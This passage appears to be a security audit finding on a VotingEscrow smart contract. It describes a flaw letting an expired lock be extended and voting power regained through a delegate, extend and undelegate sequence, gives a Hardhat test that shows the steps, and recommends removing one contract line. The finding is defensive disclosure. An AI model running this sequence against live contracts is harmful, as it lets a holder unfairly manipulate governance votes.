But in case 1, sender’s lock was not delegated to another, the sender can delegate to new address with end time of lock equal to new end time. After that he can call `increaseUnlockTime()` and move to case 2. Then sender can undelegate and the lock will be extended, and sender will take back vote power.  Here is the script : ``` typescript= describe("voting escrow", async () => {     it("increase unlock time issue", async () => {       await createSnapshot(provider);       //alice creates lock       let lockTime = WEEK + (await getTimestamp());       await ve.connect(alice).createLock(lockAmount, lockTime);       // bob creates lock       lockTime = 50 * WEEK + (await getTimestamp());       await ve.connect(bob).createLock(10 ** 8, lockTime);       //pass 1 week, alice's lock is expired       await ethers.provider.send("evm_mine", [await getTimestamp() + WEEK]);       expect(await ve.balanceOf(alice.address)).to.eq(0);       //alice can not increase unlock timme       await expect(ve.connect(alice).increaseUnlockTime(lockTime)).to.be.revertedWith("Lock expired");       //alice delegate to bob then can increase unlock time       await ve.connect(alice).delegate(bob.address);       await expect(ve.connect(alice).increaseUnlockTime(lockTime)).to.not.be.reverted;       //alice delegate back herself       await ve.connect(alice).delegate(alice.address);       expect(await ve.balanceOf(alice.address)).to.gt(0);     }); ```  ## Tools Used Manual review ## Recommended Mitigation Steps In every cases, expired locks should able to be extended -> should remove line https://github.com/code-423n4/2022-08-fiatdao/blob/main/contracts/VotingEscrow.sol#L511
